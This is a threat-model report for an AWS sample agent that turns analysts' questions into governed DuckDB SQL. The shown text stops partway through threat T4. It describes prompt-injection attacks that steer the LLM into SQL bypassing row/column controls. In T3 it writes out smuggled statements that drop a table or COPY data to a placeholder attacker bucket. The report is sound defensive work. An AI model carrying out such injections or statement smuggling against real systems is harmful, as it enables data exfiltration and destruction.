# Comprehensive Threat Model Report

**Generated**: 2026-09-02 22:31:13
**Current Phase**: 9 - Output Generation and Documentation

**Code validation re-run**: 2026-09-03 (round 2 - see "Code Validation Round 2" below; two authorization bypasses and one identity-source escalation were found in code that this model had marked resolved)
**Overall Completion**: 100.0%

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Business Context](#business-context)
3. [Classification Profiles](#classification-profiles)
4. [System Architecture](#system-architecture)
5. [Threat Actors](#threat-actors)
6. [Trust Boundaries](#trust-boundaries)
7. [Assets and Flows](#assets-and-flows)
8. [Threats](#threats)
9. [Mitigations](#mitigations)
10. [Assumptions](#assumptions)
11. [Phase Progress](#phase-progress)

## Executive Summary

Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance).

### Key Statistics

- **Total Threats**: 18
- **Total Mitigations**: 22
- **Total Assumptions**: 5
- **System Components**: 9
- **Assets**: 5
- **Threat Actors**: 12

## Business Context

**Description**: Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance).

### Business Features

- **Industry Sector**: Technology
- **Data Sensitivity**: Public
- **User Base Size**: Nano
- **Geographic Scope**: Global / Transboundary
- **Regulatory Requirements**: None
- **System Criticality**: Low
- **Financial Impact**: Negligible
- **Authentication Requirement**: Federated
- **Deployment Model**: Serverless / FaaS
- **User Base Metric**: Installs / downloads
- **Revenue Band**: Enterprise
- **Data Residency**: National / Single-Country
- **Compute Location**: National / Single-Country
- **User Base Location**: Global / Transboundary
- **Organizational HQ**: National / Single-Country

## Classification Profiles

### Software Profile

- **Software Type**: AI / ML System
- **Deployment Model**: Serverless / FaaS
- **Architecture Style**: Serverless
- **Platform / Runtime**: Cloud runtime
- **User Domain**: Financial
- **Licensing / Ownership**: Open source
- **Modern Paradigms**: Agentic AI, Cloud-native
- **Description**: Python 3.11-3.13 on Amazon Bedrock AgentCore Runtime (one microVM per session). Core modules: (1) agent.py - Strands Agent + Bedrock Claude with one gated async-generator run_sql tool over an in-memory DuckDB (httpfs/iceberg/ducklake extensions). The read-only gate enforces EXACTLY ONE statement per call (duckdb.extract_statements, the engine's own parser) and strips leading SQL comments before keyword classification; identity resolution chain: verified JWT claims (custom:tenant/custom:role normalized) -> runtime user-id header -> payload identity -> default role. The streaming entrypoint (async generator -> SSE) emits typed envelopes incl. a per-statement gate/govern/execute trace. (2) governance.py - authorization: principal->role->policy mapping where an unknown role inside a known tenant falls back to that tenant's MOST RESTRICTED policy (content-derived restrictiveness ranking, declaration-order independent); sqlglot AST rewrite injecting RLS predicates via guarded subqueries and schema-aware CLS EXCLUDE; explicit selection of a denied column is rejected with a legible policy error naming column and role; raw table functions are governed by an ALLOWLIST on AST shape (only exp.Identifier FROM/JOIN sources allowed; pure generators excepted) rather than a function-name denylist; fail-closed on unparseable SQL. (3) ui/app.py - Streamlit chat client: Cognito USER_PASSWORD_AUTH login (client secret via env), sends the ID token as bearer to the runtime over raw HTTPS, renders the interleaved reasoning+tool transcript and a Trace tab. (4) infra/ CDK - S3 buckets (SSE, BlockPublicAccess, enforce_ssl), Cognito user pool + app client, least-privilege execution role, CloudWatch logs. CI: GitLab pipeline with ruff/bandit/semgrep/detect-secrets/pytest gates (96 offline unit tests incl. mutation-verified fail-closed authz tests).

### Data Asset Profiles

| ID | Name | Asset | Category | Content Types | Sensitivity | Compliance | States | Volume | Lifecycle | Business Domain | Description |
|---|---|---|---|---|---|---|---|---|---|---|---|
| DP001 | Analytical dataset on S3 | N/A | Structured Data | Non-sensitive / other | Public | N/A | At rest, In transit | Big data | Active | N/A | Parquet/Iceberg tables on S3: public aws-public-blockchain Ethereum data (eth_traces incident-window slice in S3 Tables/Glue/DuckLake legs, full history via raw views). Customer-substituted data may be confidential. Per-tenant visibility is enforced by the RLS/CLS rewrite - the asset the governance layer protects. |
| DP002 | Identity claims (tenant, role) | N/A | API Data | Authentication credentials | Internal | N/A | In transit, In use | N/A | N/A | N/A | Cognito ID-token claims (custom:tenant/custom:role) validated by the AgentCore managed inbound JWT authorizer (allowedAudience) BEFORE agent code runs, then normalized by _resolve_claims; or identity asserted by a SigV4-authenticated calling application (runtime user-id header / payload identity - local/CLI path). Integrity of these claims is the security foundation of the authorization layer. |
| DP003 | Governance policy table | N/A | Configuration Data | System metadata | Internal | N/A | At rest, In use | N/A | N/A | N/A | GOVERNANCE_POLICIES JSON env configuration: per-table row_filter / deny_columns + allow_raw_paths switch, keyed by tenant:role. Defines who sees what; owned by the operator. Unknown roles in a known tenant resolve to the tenant's most restricted policy (content-derived ranking). |
| DP004 | Attribution label tables | N/A | Structured Data | PII, Non-sensitive / other | Internal | N/A | At rest, In transit | Small | N/A | N/A | ofac_addresses (REAL public OFAC SDN list, ~120 rows) and cex_deposit_labels (SYNTHETIC exchange deposit labels whose subject_identity column mimics customer KYC linkage to demonstrate CLS). subject_identity is column-denied to the junior role; in a real deployment this table carries actual KYC linkage and its protection is the point of the CLS demo. |
| DP005 | Cognito app client secret | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | App client secret used by the Streamlit UI for SECRET_HASH computation during USER_PASSWORD_AUTH login. Supplied via environment variable to the UI process; never committed to the repo. |
| DP006 | DuckLake PostgreSQL credentials | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | Optional multi-writer catalog credentials stored in AWS Secrets Manager, fetched at runtime by the execution role; never in env vars or code. |

### User Personas

| ID | Persona | Name | Privilege | Affiliation | Roles | Intent | Entity Type | Authentication | Threat Actor Overlay | In Scope | Description |
|---|---|---|---|---|---|---|---|---|---|---|---|
| UP001 | Authenticated Standard User | End user (investigator / junior analyst) | Low | Customer | End User | Legitimate | Human | Token | N/A | Yes | Logs in at Cognito; ID-token claims carry tenant/role; may be a restricted principal whose data visibility is limited by RLS/CLS policy. Primary adversary in this model: tries to observe other tenants' rows or denied columns through crafted natural-language questions (prompt injection into generated SQL). |
| UP002 | Non-Human Identity / Service Account | Calling application (SigV4) | Elevated | Customer | Integration Endpoint | Legitimate | Non-Human | IAM Role | N/A | Yes | IAM-authenticated infrastructure invoking the runtime on the local/CLI path; trusted to assert its end-users' identity via the runtime user-id header or payload identity object. Its compromise means arbitrary identity assertion - documented trust assumption; unused when the JWT authorizer is configured (the deployed default). |
| UP003 | Developer / DevOps User | Operator (deployer) | Administrative | Customer | Administrator, Developer | Legitimate | Human | IAM Role | N/A | Yes | Customer engineer deploying the sample; owns all env configuration including GOVERNANCE_POLICIES, Cognito pool/users, and catalog ARNs. Out of scope as an adversary (owns the account and the data). |
| UP004 | Non-Human Identity / Service Account | LLM (Bedrock Claude) | Low | N/A | Service Account | Compromised | Non-Human | None | N/A | Yes | Generates SQL from natural language. Untrusted-input channel: its output executes against the engine after the single-statement read-only gate and governance rewrite. Subject to prompt injection via user questions; treated as an attacker-controlled SQL source in this model. |

### Non-Functional Requirements

- **Fail-Safe Behaviour**: Revert to safe state — The governance layer must fail closed: a restricted principal must never observe rows or columns outside their policy via any of the four access paths. Unparseable SQL, schema-probe failure, unknown principal (falls to the tenant's MOST restricted policy or the default role), and explicit denied-column selection must result in rejection or the most restrictive policy - never fail-open. Verified by mutation testing (code-validation fixes). Re-validated 2026-09-03 (round 2): completeness is part of the requirement - unmodellable statement shapes are rejected, local names may not shadow governed tables, and a principal with no policy gets the deny-all floor rather than an unrestricted default.
- **User Error Protection**: Strong — Agent-generated SQL (which may be wrong or adversarial via prompt injection) must not write persistently, exfiltrate to external targets (COPY TO), attach foreign databases, smuggle a second statement behind a read (single-statement rule enforced with the engine's own parser), or reach raw file-reading table functions as a restricted principal (AST-shape allowlist, not a name denylist).

## System Architecture

### Components

| ID | Name | Type | Service Provider | Description |
|---|---|---|---|---|
| C001 | Streamlit chat UI | Compute | Other | Chat client: Cognito USER_PASSWORD_AUTH login (app client secret from env), sends the ID token as Bearer over raw HTTPS to the runtime, parses the SSE envelope stream, renders the interleaved reasoning+tool transcript and a Trace tab. Holds the user's ID token and the app client secret in process memory. |
| C002 | Amazon Cognito user pool | Security | AWS | Identity provider: user pool with custom:tenant/custom:role attributes; app client (with secret) using USER_PASSWORD_AUTH. Issues ID tokens whose aud = app client id; the runtime authorizer validates allowedAudience against it. |
| C003 | AgentCore Runtime + inbound JWT authorizer (managed) | Compute | AWS | One microVM per session; hosts the agent process. Managed customJWTAuthorizer validates the Cognito ID token (signature via discovery URL, allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards Authorization. Serves the async-generator entrypoint as SSE. AWS-managed, out of sample scope. |
| C004 | Identity resolution (_resolve_claims) | Security | N/A | agent.py: extracts claims in trust order: verified JWT claims (custom:tenant/custom:role normalized to tenant/role) -> X-Amzn-Bedrock-AgentCore-Runtime-User-Id header (SigV4 caller asserts) -> payload identity object -> default role. jwt.decode(verify_signature=False) is claims EXTRACTION from a token already verified by the managed authorizer. |
| C005 | Strands Agent + Bedrock Claude | Compute | AWS | LLM writes SQL from natural-language questions; reads tool results; emits streaming events. Its SQL output is untrusted input to the pipeline. The streaming entrypoint maps Strands events to typed SSE envelopes including the per-statement gate/govern/execute trace. |
| C006 | run_sql gate (single-statement + read-only) | Security | N/A | agent.py: async-generator tool. Gate strips leading SQL comments for keyword classification, requires EXACTLY ONE statement (duckdb.extract_statements — the engine's own parser, no lexer divergence), and allowlists read statements + CREATE TEMP TABLE/VIEW; rejects persistent writes, ATTACH, COPY TO, and multi-statement smuggling. First control in the SQL pipeline; emits gate trace events. |
| C007 | Governance rewrite (governance.py) | Security | N/A | AuthZ layer: principal->role->policy (unknown role in a known tenant falls back to that tenant's MOST restricted policy, content-derived ranking); sqlglot AST rewrite — RLS predicates via guarded subqueries, schema-aware CLS EXCLUDE, explicit denied-column selection rejected with a legible policy error, raw table functions governed by an AST-shape ALLOWLIST (only exp.Identifier FROM/JOIN sources; pure generators excepted), fail-closed on parse failure. Runs after the gate, before the engine; emits govern trace events (rls[]/cls[]/rejection). |
| C008 | DuckDB engine (in-process) | Analytics | N/A | In-memory embedded OLAP engine; dies with the session; READ_ONLY catalog attaches; resource envelope via memory_limit + spill. Executes only gated+governed single statements under _conn_lock serialization. |
| C009 | CloudWatch Logs | Other | AWS | Runtime logs incl. per-query engine metrics and governed flag. |

### Connections

| ID | Source | Destination | Protocol | Port | Encrypted | Description |
|---|---|---|---|---|---|---|
| CN001 | Streamlit chat UI (C001) | Amazon Cognito user pool (C002) | HTTPS | 443 | Yes | UI logs the user in (USER_PASSWORD_AUTH + SECRET_HASH); Cognito returns ID/access/refresh tokens. UI keeps the ID token for the bearer header. |
| CN002 | Streamlit chat UI (C001) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | UI POSTs {prompt} to the runtime /invocations endpoint with Authorization: Bearer <ID token> and a session id header; consumes the SSE envelope stream (text/reasoning/tool_start/trace/result) back. The managed authorizer validates the token before agent code runs. |
| CN003 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | Identity resolution (_resolve_claims) (C004) | HTTPS | N/A | Yes | Runtime invokes the agent entrypoint with allowlisted headers (Authorization JWT already validated by the managed authorizer) + payload. Claims extraction happens in _resolve_claims. |
| CN004 | Identity resolution (_resolve_claims) (C004) | Governance rewrite (governance.py) (C007) | Other | N/A | Yes | Resolved principal (tenant:role) sets the active role for the session; governance resolves role -> policy (unknown role -> tenant's most restricted). |
| CN005 | Strands Agent + Bedrock Claude (C005) | run_sql gate (single-statement + read-only) (C006) | Other | N/A | Yes | LLM emits SQL via the run_sql tool call; enters the single-statement read-only gate. UNTRUSTED input crossing. |
| CN006 | run_sql gate (single-statement + read-only) (C006) | Governance rewrite (governance.py) (C007) | Other | N/A | Yes | Gate-passed single statement enters the governance rewrite (RLS/CLS injection, denied-column rejection, raw-path allowlist, fail-closed parse). |
| CN007 | Governance rewrite (governance.py) (C007) | DuckDB engine (in-process) (C008) | Other | N/A | Yes | Governed SQL executes on the in-process engine under _conn_lock serialization. |
| CN008 | DuckDB engine (in-process) (C008) | S3 analytical data (4 access paths) (D001) | HTTPS | 443 | Yes | Engine reads S3/Iceberg/DuckLake data over httpfs with the execution role's scoped read-only credentials (SigV4, TLS). |
| CN009 | DuckDB engine (in-process) (C008) | Label tables on S3 (OFAC + synthetic CEX) (D002) | HTTPS | 443 | Yes | Engine reads the label-table Parquet files (attribution joins) with the same scoped read-only role. |
| CN010 | DuckDB engine (in-process) (C008) | Secrets Manager (DuckLake PG credentials) (D003) | HTTPS | 443 | Yes | Optional: fetch DuckLake PostgreSQL catalog credentials from Secrets Manager at attach time. |
| CN011 | Strands Agent + Bedrock Claude (C005) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | Agent model loop calls Amazon Bedrock (Claude) via the runtime's execution role; streaming events flow back through the entrypoint to the SSE channel. |
| CN012 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | CloudWatch Logs (C009) | HTTPS | 443 | Yes | Runtime/agent logs to CloudWatch incl. engine metrics and governed flag. |

### Data Stores

| ID | Name | Type | Classification | Encrypted at Rest | Description |
|---|---|---|---|---|---|
| D001 | S3 analytical data (4 access paths) | Object Storage | Public | Yes | Amazon S3 / S3 Tables / Glue Data Catalog / DuckLake: same logical tables reachable via raw Parquet glob, S3 Tables Iceberg REST, Glue federated Iceberg REST, and DuckLake catalog. All attached READ_ONLY. Buckets: SSE, BlockPublicAccess.BLOCK_ALL, enforce_ssl. Sample data public; customer-substituted data may be confidential. |
| D002 | Label tables on S3 (OFAC + synthetic CEX) | Object Storage | Internal | Yes | ofac_addresses.parquet (real public OFAC SDN list) and cex_deposit_labels.parquet (synthetic; subject_identity mimics KYC linkage and is the CLS-protected column) under LABELS_PREFIX on the hardened bucket. |
| D003 | Secrets Manager (DuckLake PG credentials) | Other | Restricted | Yes | AWS Secrets Manager: optional PostgreSQL catalog credentials for the multi-writer DuckLake form; fetched at runtime by the execution role; never in env or code. |

## Threat Actors

### Insider

- **Type**: Insider Threat
- **Motivations**: Financial gain, Revenge / grievance
- **Resources**: Individual
- **Relationship to Target**: Internal
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: Yes
- **Priority**: 1/10
- **Description**: The model's PRIMARY adversary: a legitimately authenticated but restricted analyst (valid Cognito login, restricted tenant:role) who crafts natural-language questions to steer the LLM into SQL that bypasses the RLS/CLS rewrite — cross-tenant rows, denied columns, raw file reads, or multi-statement smuggling.

### External Attacker

- **Type**: External Attacker
- **Motivations**: Financial gain
- **Resources**: Club / small group
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 1 - Opportunistic / script kiddie
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 2/10
- **Description**: External party probing a deployed sample's public runtime endpoint: forged/absent JWTs, token-audience confusion, or replaying captured bearer tokens.

### Nation-state Actor

- **Type**: Nation-State / APT
- **Motivations**: Espionage / intelligence collection
- **Resources**: Government
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 5 - Nation-state APT / elite
- **State Nexus**: State-executed
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A state intelligence or military group operating with advanced capabilities

### Hacktivist

- **Type**: Hacktivist
- **Motivations**: Ideological / hacktivism
- **Resources**: Contest / crowd
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Sector-focused
- **Relevant**: No
- **Description**: An individual or group motivated by ideological or political beliefs

### Organized Crime

- **Type**: Financially Motivated Cybercriminal / Organized Crime
- **Motivations**: Financial gain
- **Resources**: Organization
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 3 - Organized cybercrime
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: No
- **Description**: A criminal organization with significant resources

### Competitor

- **Type**: Competitor / Corporate Espionage
- **Motivations**: Competitive advantage, Espionage / intelligence collection
- **Resources**: Organization
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 3 - Organized cybercrime
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A business competitor seeking competitive advantage

### Script Kiddie

- **Type**: Script Kiddie / Novice
- **Motivations**: Thrill-seeking / notoriety
- **Resources**: Individual
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 1 - Opportunistic / script kiddie
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 5/10
- **Description**: Opportunistic scanning of exposed demo deployments (default test users with a documented password are provisioned by the sample's CDK — rotating them is the deployer's job).

### Disgruntled Employee

- **Type**: Disgruntled Employee
- **Motivations**: Revenge / grievance
- **Resources**: Individual
- **Relationship to Target**: Internal
- **Sophistication Tier**: Tier 1 - Opportunistic / script kiddie
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A current or former employee with a grievance

### Privileged User

- **Type**: Privileged User
- **Motivations**: Financial gain
- **Resources**: Individual
- **Relationship to Target**: Internal
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: Yes
- **Priority**: 4/10
- **Description**: Operator misconfiguration as an unintentional threat: malformed GOVERNANCE_POLICIES, deploying without the inbound authorizer, or leaking the Cognito app client secret.

### Third Party

- **Type**: Third Party
- **Motivations**: Financial gain
- **Resources**: Organization
- **Relationship to Target**: Partner / third-party
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 3/10
- **Description**: A compromised calling application on the SigV4 path (local/CLI), able to assert arbitrary tenant:role via the user-id header or payload identity — documented trust assumption, unused under the deployed JWT authorizer.

### Terrorist Organization

- **Type**: Terrorist Organization
- **Motivations**: Ideological / hacktivism, Disruption / destruction
- **Resources**: Club / small group
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Sector-focused
- **Relevant**: No
- **Description**: A group with limited offensive cyber capability, primarily using the internet for propaganda and recruitment

### Private Sector Offensive Actor

- **Type**: Private Sector Offensive Actor / Cyber Mercenary
- **Motivations**: Financial gain
- **Resources**: Organization
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 4 - State-nexus / advanced
- **State Nexus**: State-aligned
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A commercial vendor developing zero-day exploits and spyware for client-selected targets

## Trust Boundaries

### Trust Zones

#### Client side (UI + end user + LLM output)

- **Trust Level**: Untrusted
- **Architecture Nodes**: Streamlit chat UI (C001), Strands Agent + Bedrock Claude (C005)
- **Description**: The Streamlit UI runs on the analyst's machine (holds ID token + app client secret in process env/memory); natural-language questions from end users AND the SQL the LLM generates from them. Prompt injection makes LLM output attacker-influenced.

#### AWS managed platform

- **Trust Level**: High
- **Architecture Nodes**: Amazon Cognito user pool (C002), AgentCore Runtime + inbound JWT authorizer (managed) (C003), CloudWatch Logs (C009)
- **Description**: Cognito user pool (token issuance), AgentCore Runtime + managed JWT authorizer (microVM isolation, pre-code token validation), Bedrock service, CloudWatch. AWS-operated; trusted per the shared-responsibility model.

#### Agent process (sample code)

- **Trust Level**: Medium
- **Architecture Nodes**: Identity resolution (_resolve_claims) (C004), run_sql gate (single-statement + read-only) (C006), Governance rewrite (governance.py) (C007), DuckDB engine (in-process) (C008)
- **Description**: The session's microVM process: identity resolution, single-statement read-only gate, governance rewrite, in-process DuckDB. Executes untrusted SQL under layered controls; one session = one principal = one engine.

#### Customer account data plane

- **Trust Level**: High
- **Architecture Nodes**: S3 analytical data (4 access paths) (D001), Label tables on S3 (OFAC + synthetic CEX) (D002), Secrets Manager (DuckLake PG credentials) (D003)
- **Description**: S3 buckets/catalogs (analytical data + label tables), Secrets Manager entries in the customer's own account, reached only via the scoped read-only execution role.

### Trust Boundaries

#### Inbound AuthN edge (Cognito + managed authorizer)

- **Type**: Network
- **Controls**: Cognito user pool AuthN (USER_PASSWORD_AUTH + SECRET_HASH), AgentCore customJWTAuthorizer: signature via discovery URL + allowedAudience validation BEFORE agent code, requestHeaderAllowlist limits forwarded headers to Authorization, TLS on all calls
- **Description**: The deployed sample's real authentication perimeter: only requests carrying a valid Cognito ID token for the configured audience reach a runtime session. Verified: no-token=401, forged-token=403, both pre-code.

#### Platform -> agent identity handoff

- **Type**: Virtual Machine
- **Controls**: Managed authorizer verifies before agent code, claims normalization custom:tenant/custom:role -> tenant:role, trust-ordered fallback chain with default-role floor, unknown role in a known tenant -> tenant's MOST restricted policy (content-derived ranking, order-independent)
- **Description**: Verified identity crosses from the managed authorizer into agent code as claims. AuthN happens platform-side; the sample only consumes verified claims. SigV4 fallback identity sources are caller-asserted (documented trust assumption, local/CLI path only).

#### Untrusted SQL -> agent controls

- **Type**: Process
- **Controls**: single-statement rule via duckdb.extract_statements (engine's own parser), leading-comment stripping before keyword classification, read-only statement allowlist (read + CREATE TEMP), governance rewrite: RLS guarded subqueries, schema-aware CLS EXCLUDE, explicit denied-column selection rejected with a legible policy error, raw table functions: AST-shape ALLOWLIST (Identifier sources only; pure generators excepted), fail-closed on unparseable SQL
- **Description**: LLM-generated SQL (attacker-influenceable via prompt injection) crosses into the agent process. THE central boundary of this model. All controls mutation-tested (code validation).

#### Agent -> customer data plane

- **Type**: Account
- **Controls**: scoped read-only IAM execution role, READ_ONLY catalog attaches, TLS in transit, SSE + BlockPublicAccess + enforce_ssl on buckets, Secrets Manager for PG credentials
- **Description**: Engine reads S3/catalog/label data with the scoped read-only execution role over TLS. Only governed SQL output flows back.

## Assets and Flows

### Assets

| ID | Name | Type | Classification | Lifecycle | Data States | Criticality | Owner |
|---|---|---|---|---|---|---|---|
| A001 | Governed analytical rows/columns | Data | Internal | N/A | At rest, In transit, In use | 4 | N/A |
| A002 | Cognito ID token (tenant/role claims) | Token | Confidential | N/A | In transit, In use | 5 | N/A |
| A003 | Cognito app client secret | Credential | Restricted | N/A | At rest, In use | 3 | N/A |
| A004 | GOVERNANCE_POLICIES configuration | Configuration | Internal | N/A | At rest, In use | 4 | N/A |
| A005 | Agent-generated SQL (untrusted) | Data | Internal | N/A | In transit, In use | 4 | N/A |

### Asset Flows

| ID | Asset | Source | Destination | Protocol | Encrypted | Risk Level |
|---|---|---|---|---|---|---|
| F001 | Cognito ID token (tenant/role claims) | Amazon Cognito user pool (C002) | Streamlit chat UI (C001) | HTTPS | Yes | N/A |
| F002 | Cognito ID token (tenant/role claims) | Streamlit chat UI (C001) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | Yes | N/A |
| F003 | Cognito app client secret | Streamlit chat UI (C001) | Amazon Cognito user pool (C002) | HTTPS | Yes | N/A |
| F004 | Agent-generated SQL (untrusted) | Strands Agent + Bedrock Claude (C005) | run_sql gate (single-statement + read-only) (C006) | N/A | Yes | 4 |
| F005 | Agent-generated SQL (untrusted) | run_sql gate (single-statement + read-only) (C006) | Governance rewrite (governance.py) (C007) | N/A | Yes | 3 |
| F006 | GOVERNANCE_POLICIES configuration | Governance rewrite (governance.py) (C007) | Governance rewrite (governance.py) (C007) | N/A | No | N/A |
| F007 | Governed analytical rows/columns | S3 analytical data (4 access paths) (D001) | DuckDB engine (in-process) (C008) | HTTPS | Yes | N/A |
| F008 | Governed analytical rows/columns | Label tables on S3 (OFAC + synthetic CEX) (D002) | DuckDB engine (in-process) (C008) | HTTPS | Yes | N/A |
| F009 | Governed analytical rows/columns | DuckDB engine (in-process) (C008) | Streamlit chat UI (C001) | HTTPS | Yes | N/A |

## Threats

### Resolved Threats

#### T1: Restricted end user (authenticated, low privilege)

**Statement**: A Restricted end user (authenticated, low privilege) Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions can Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns, which leads to Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer

- **Prerequisites**: Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions
- **Action**: Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns
- **Impact**: Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer
- **Impacted Assets**: A001
- **Tags**: prompt-injection, authz-bypass, core-threat
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: AST-level rewrite covers all four access paths; the completeness rules close the two bypasses found on 2026-09-03 - local names may not shadow a governed table (M018) and unmodellable statement shapes are rejected (M017) - so a governed name always denotes the governed table and no statement reaches the engine unrewritten. 49 adversarial regressions (nine shadowing shapes incl. recursive CTE, CTAS target and alias forms) plus per-persona cloud verification on runtime v15. Residual: novel sqlglot-vs-DuckDB semantic divergence, bounded by fail-closed parsing and a read-only worst case.
- **Assessment State**: Current

#### T2: Restricted end user via LLM prompt injection

**Statement**: A Restricted end user via LLM prompt injection Same as above; knowledge that an embedded engine executes generated SQL can Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified, which leads to Ungoverned statement reaches the engine - RLS/CLS bypass

- **Prerequisites**: Same as above; knowledge that an embedded engine executes generated SQL
- **Action**: Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified
- **Impact**: Ungoverned statement reaches the engine - RLS/CLS bypass
- **Impacted Assets**: A001
- **Tags**: parser-divergence, fail-closed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Unparseable SQL is rejected for restricted principals, and SQL that parses only as an opaque Command is now rejected too (M017) - previously the fail-closed claim covered parse FAILURE but not parse DEGRADATION, which was the live bypass. A statement would need to parse cleanly into a governable root in sqlglot AND mean something different to DuckDB; worst case is still read-only within the session.
- **Assessment State**: Current

#### T3: Restricted end user via LLM prompt injection

**Statement**: A Restricted end user via LLM prompt injection Valid restricted session; gate classifies on the leading keyword can Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement, which leads to Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate

- **Prerequisites**: Valid restricted session; gate classifies on the leading keyword
- **Action**: Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement
- **Impact**: Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate
- **Impacted Assets**: A001, A005
- **Tags**: multi-statement, write-gate, phase-7.5-fix
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Single-statement rule uses the engine's own parser (no lexer divergence to aim at); mutation-verified; end-to-end test proves the second statement never reaches the engine. Layers 2-3 (READ_ONLY attaches, no write IAM) still bound any residual.
- **Assessment State**: Current

#### T4: Restricted end user via LLM prompt injection

**Statement**: A Restricted end user via LLM prompt injection Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release can Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every, which leads to Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass

- **Prerequisites**: Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release
- **Action**: Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every
- **Impact**: Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass
- **Impacted Assets**: A001
- **Tags**: raw-path, allowlist, phase-7.5-fix
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
